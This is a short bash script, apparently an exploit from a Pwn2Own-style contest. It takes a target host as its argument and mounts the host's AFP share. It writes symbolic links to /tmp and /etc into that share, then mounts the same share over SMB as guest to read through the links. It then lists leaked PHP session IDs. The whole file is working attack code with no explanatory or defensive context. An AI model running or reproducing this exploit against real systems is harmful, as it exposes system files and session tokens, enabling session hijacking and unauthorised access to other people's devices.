#!/bin/bash
echo "setting up directories"
sleep 1
mkdir /tmp
mkdir /tmp/pwn2own
echo "mounting afp share"
sleep 1
mount_afp afp://$1/Public /tmp/pwn2own
echo "creating symbolic link"
sleep 1
ln -s /tmp /tmp/pwn2own/tmp
ln -s /etc /tmp/pwn2own/etc
mkdir /tmp/pwn2ownsmb
echo "mounting smb share"
sleep 1
mount_smbfs smb://guest@$1/Public /tmp/pwn2ownsmb
sleep 1
echo "leaked sessions are"
ls /tmp/pwn2ownsmb/tmp | grep sess_ | cut -d _ -f 2


